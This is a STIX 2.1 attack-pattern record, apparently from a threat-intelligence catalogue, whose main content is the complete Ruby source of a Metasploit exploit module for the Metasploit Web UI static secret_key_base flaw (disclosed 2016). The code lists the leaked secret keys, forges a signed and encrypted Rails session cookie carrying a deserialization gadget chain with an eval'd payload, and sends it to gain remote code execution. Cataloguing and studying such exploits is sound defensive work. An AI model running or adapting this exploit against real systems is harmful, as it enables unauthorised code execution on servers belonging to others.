{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2d4c5388-689f-46ef-a4d6-bb85a5f05e47",
    "created": "2024-08-14T17:09:12.077189Z",
    "modified": "2024-08-14T17:09:12.077193Z",
    "name": "Metasploit Web UI Static secret_key_base Value",
    "description": " This module exploits the Web UI for Metasploit Community, Express and Pro where one of a certain set of Weekly Releases have been applied. These Weekly Releases introduced a static secret_key_base value. Knowledge of the static secret_key_base value allows for deserialization of a crafted Ruby Object, achieving code execution.  This module is based on exploits/multi/http/rails_secret_deserialization ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/metasploit_static_secret_key_base.rb",
            "external_id": "metasploit_static_secret_key_base.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2016/09/15/important-security-fixes-in-metasploit-4120-2016091401"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/justinsteven/advisories/blob/master/2016_metasploit_rce_static_key_deserialization.md"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #Helper Classes copy/paste from Rails4\n  class MessageVerifier\n\n    class InvalidSignature < StandardError; end\n\n    def initialize(secret, options = {})\n      @secret = secret\n      @digest = options[:digest] || 'SHA1'\n      @serializer = options[:serializer] || Marshal\n    end\n\n    def generate(value)\n      data = ::Base64.strict_encode64(@serializer.dump(value))\n      \"#{data}--#{generate_digest(data)}\"\n    end\n\n    def generate_digest(data)\n      require 'openssl' unless defined?(OpenSSL)\n      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)\n    end\n\n  end\n\n  class MessageEncryptor\n\n    module NullSerializer #:nodoc:\n\n      def self.load(value)\n        value\n      end\n\n      def self.dump(value)\n        value\n      end\n\n    end\n\n    class InvalidMessage < StandardError; end\n\n    OpenSSLCipherError = OpenSSL::Cipher::CipherError\n\n    def initialize(secret, *signature_key_or_options)\n      options = signature_key_or_options.extract_options!\n      sign_secret = signature_key_or_options.first\n      @secret = secret\n      @sign_secret = sign_secret\n      @cipher = options[:cipher] || 'aes-256-cbc'\n      @verifier = MessageVerifier.new(@sign_secret || @secret, :serializer => NullSerializer)\n      # @serializer = options[:serializer] || Marshal\n    end\n\n    def encrypt_and_sign(value)\n      @verifier.generate(_encrypt(value))\n    end\n\n    def _encrypt(value)\n      cipher = new_cipher\n      cipher.encrypt\n      cipher.key = @secret\n      # Rely on OpenSSL for the initialization vector\n      iv = cipher.random_iv\n      #encrypted_data = cipher.update(@serializer.dump(value))\n      encrypted_data = cipher.update(value)\n      encrypted_data << cipher.final\n      [encrypted_data, iv].map {|v| ::Base64.strict_encode64(v)}.join(\"--\")\n    end\n\n    def new_cipher\n      OpenSSL::Cipher.new(@cipher)\n    end\n\n  end\n\n  class KeyGenerator\n\n    def initialize(secret, options = {})\n      @secret = secret\n      @iterations = options[:iterations] || 2**16\n    end\n\n    def generate_key(salt, key_size=64)\n      OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)\n    end\n\n  end\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Metasploit Web UI Static secret_key_base Value',\n      'Description'    => %q{\n        This module exploits the Web UI for Metasploit Community, Express and\n        Pro where one of a certain set of Weekly Releases have been applied.\n        These Weekly Releases introduced a static secret_key_base value.\n        Knowledge of the static secret_key_base value allows for\n        deserialization of a crafted Ruby Object, achieving code execution.\n\n        This module is based on\n        exploits/multi/http/rails_secret_deserialization\n      },\n      'Author'         =>\n        [\n          'Justin Steven',    # @justinsteven\n          'joernchen of Phenoelit <joernchen[at]phenoelit.de>'  # author of rails_secret_deserialization\n        ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n          ['OVE', '20160904-0002'],\n          ['URL', 'https://www.rapid7.com/blog/post/2016/09/15/important-security-fixes-in-metasploit-4120-2016091401'],\n          ['URL', 'https://github.com/justinsteven/advisories/blob/master/2016_metasploit_rce_static_key_deserialization.md']\n        ],\n      'DisclosureDate' => '2016-09-15',\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => false,\n      'Targets'        => [ ['Automatic', {} ] ],\n      'DefaultTarget'  => 0,\n      'DefaultOptions' =>\n        {\n          'SSL'   => true\n        }\n      ))\n\n    register_options(\n      [\n        Opt::RPORT(3790),\n        OptString.new('TARGETURI', [ true, 'The path to the Metasploit Web UI', \"/\"]),\n      ])\n  end\n\n\n  #\n  # This stub ensures that the payload runs outside of the Rails process\n  # Otherwise, the session can be killed on timeout\n  #\n  def detached_payload_stub(code)\n  %Q^\n    code = '#{ Rex::Text.encode_base64(code) }'.unpack(\"m0\").first\n    if RUBY_PLATFORM =~ /mswin|mingw|win32/\n      inp = IO.popen(\"ruby\", \"wb\") rescue nil\n      if inp\n        inp.write(code)\n        inp.close\n      end\n    else\n      Kernel.fork do\n        eval(code)\n      end\n    end\n    {}\n  ^.strip.split(/\\n/).map{|line| line.strip}.join(\"\\n\")\n  end\n\n  def check_secret(data, digest, secret)\n    data = Rex::Text.uri_decode(data)\n    keygen = KeyGenerator.new(secret,{:iterations => 1000})\n    sigkey = keygen.generate_key('signed encrypted cookie')\n    digest == OpenSSL::HMAC.hexdigest(OpenSSL::Digest.new('SHA1'), sigkey, data)\n  end\n\n  def get_secret(data, digest)\n    secrets = [\n      ['4.12.0_2016061501', 'd25e9ad8c9a1558a6864bc38b1c79eafef479ccee5ad0b4b2ff6a917cd8db4c6b80d1bf1ea960f8ef922ddfebd4525fcff253a18dd78a18275311d45770e5c9103fc7b639ecbd13e9c2dbba3da5c20ef2b5cbea0308acfc29239a135724ddc902ccc6a378b696600a1661ed92666ead9cdbf1b684486f5c5e6b9b13226982dd7'],\n      ['4.12.0_2016062101', '99988ff528cc0e9aa0cc52dc97fe1dd1fcbedb6df6ca71f6f5553994e6294d213fcf533a115da859ca16e9190c53ddd5962ddd171c2e31a168fb8a8f3ef000f1a64b59a4ea3c5ec9961a0db0945cae90a70fd64eb7fb500662fc9e7569c90b20998adeca450362e5ca80d0045b6ae1d54caf4b8e6d89cc4ebef3fd4928625bfc'],\n      ['4.12.0_2016062101', '446db15aeb1b4394575e093e43fae0fc8c4e81d314696ac42599e53a70a5ebe9c234e6fa15540e1fc3ae4e99ad64531ab10c5a4deca10c20ba6ce2ae77f70e7975918fbaaea56ed701213341be929091a570404774fd65a0c68b2e63f456a0140ac919c6ec291a766058f063beeb50cedd666b178bce5a9b7e2f3984e37e8fde'],\n      ['4.12.0_2016081001', '61c64764ca3e28772bddd3b4a666d5a5611a50ceb07e3bd5847926b0423987218cfc81468c84a7737c23c27562cb9bf40bc1519db110bf669987c7bb7fd4e1850f601c2bf170f4b75afabf86d40c428e4d103b2fe6952835521f40b23dbd9c3cac55b543aef2fb222441b3ae29c3abbd59433504198753df0e70dd3927f7105a'],\n      ['4.12.0_2016081201', '23bbd1fdebdc5a27ed2cb2eea6779fdd6b7a1fa5373f5eeb27450765f22d3f744ad76bd7fbf59ed687a1aba481204045259b70b264f4731d124828779c99d47554c0133a537652eba268b231c900727b6602d8e5c6a73fe230a8e286e975f1765c574431171bc2af0c0890988cc11cb4e93d363c5edc15d5a15ec568168daf32'],\n      ['4.12.0_2016083001', '18edd3c0c08da473b0c94f114de417b3cd41dace1dacd67616b864cbe60b6628e8a030e1981cef3eb4b57b0498ad6fb22c24369edc852c5335e27670220ea38f1eecf5c7bb3217472c8df3213bc314af30be33cd6f3944ba524c16cafb19489a95d969ada268df37761c0a2b68c0eeafb1355a58a9a6a89c9296bfd606a79615'],\n      ['unreleased build', 'b4bc1fa288894518088bf70c825e5ce6d5b16bbf20020018272383e09e5677757c6f1cc12eb39421eaf57f81822a434af10971b5762ae64cb1119054078b7201fa6c5e7aacdc00d5837a50b20a049bd502fcf7ed86b360d7c71942b983a547dde26a170bec3f11f42bee6a494dc2c11ae7dbd6d17927349cdcb81f0e9f17d22c']\n    ]\n    for secret in secrets\n      return secret if check_secret(data, digest, secret[1])\n    end\n    [nil, nil]\n  end\n\n  def build_signed_cookie(secret)\n    keygen = KeyGenerator.new(secret,{:iterations => 1000})\n    enckey = keygen.generate_key('encrypted cookie')\n    sigkey = keygen.generate_key('signed encrypted cookie')\n    crypter = MessageEncryptor.new(enckey, sigkey)\n\n    # Embed the payload within detached stub\n    code =\n      \"eval('\" +\n      Rex::Text.encode_base64(detached_payload_stub(payload.encoded)) +\n      \"'.unpack('m0').first)\"\n\n    # Embed code within Rails 4 popchain\n    cookie = \"\\x04\\b\" +\n    \"o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\\b\" +\n      \":\\x0E@instanceo\" +\n        \":\\bERB\\x07\" +\n          \":\\t@src\"+  Marshal.dump(code)[2..-1] +\n          \":\\x0c@lineno\"+ \"i\\x00\" +\n      \":\\f@method:\\vresult:\" +\n      \"\\x10@deprecatoro:\\x1FActiveSupport::Deprecation\\x00\"\n\n    crypter.encrypt_and_sign(cookie)\n  end\n\n  def check\n    cookie_name = '_ui_session'\n\n    vprint_status(\"Checking for cookie #{cookie_name}\")\n    res = send_request_cgi({\n      'uri'    => datastore['TARGETURI'] || \"/\",\n      'method' => 'GET',\n    }, 25)\n\n    unless res\n      return Exploit::CheckCode::Unknown   # Target didn't respond\n    end\n\n    if res.get_cookies.empty?\n      return Exploit::CheckCode::Unknown   # Target didn't send us any cookies. We can't continue.\n    end\n\n    match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n\n    unless match\n      return Exploit::CheckCode::Unknown   # Target didn't send us a session cookie. We can't continue.\n    end\n\n    if match[1] == cookie_name\n      vprint_status(\"Found cookie\")\n    else\n      vprint_status(\"Adjusting cookie name to #{match[1]}\")\n      cookie_name = match[1]\n    end\n\n    vprint_status(\"Searching for proper secret\")\n\n    (version, secret) = get_secret(match[2], match[3])\n\n    if secret\n      vprint_status(\"Found secret, detected version #{version}\")\n      Exploit::CheckCode::Appears\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  #\n  # Send the actual request\n  #\n  def exploit\n    cookie_name = '_ui_session'\n\n    print_status(\"Checking for cookie #{cookie_name}\")\n\n    res = send_request_cgi({\n      'uri'    => datastore['TARGETURI'] || \"/\",\n      'method' => 'GET',\n    }, 25)\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target didn't respond\")\n    end\n\n    if res.get_cookies.empty?\n      fail_with(Failure::UnexpectedReply, \"Target didn't send us any cookies. We can't continue.\")\n    end\n\n    match = res.get_cookies.match(/([_A-Za-z0-9]+)=([A-Za-z0-9%]*)--([0-9A-Fa-f]+);/)\n\n    unless match\n      fail_with(Failure::UnexpectedReply, \"Target didn't send us a session cookie. We can't continue.\")\n    end\n\n    if match[1] == cookie_name\n      vprint_status(\"Found cookie\")\n    else\n      print_status(\"Adjusting cookie name to #{match[1]}\")\n      cookie_name = match[1]\n    end\n\n    print_status(\"Searching for proper secret\")\n\n    (version, secret) = get_secret(match[2], match[3])\n\n    unless secret\n      fail_with(Failure::NotVulnerable, \"SECRET not found, target not vulnerable?\")\n    end\n\n    print_status(\"Found secret, detected version #{version}\")\n\n    cookie = build_signed_cookie(secret)\n\n    print_status \"Sending cookie #{cookie_name}\"\n    res = send_request_cgi({\n      'uri'     => datastore['TARGETURI'] || \"/\",\n      'method'  => 'GET',\n      'headers' => {'Cookie' => cookie_name+\"=\"+ cookie},\n    }, 25)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-15",
    "x_mitre_platforms": [
        "ruby'"
    ]
}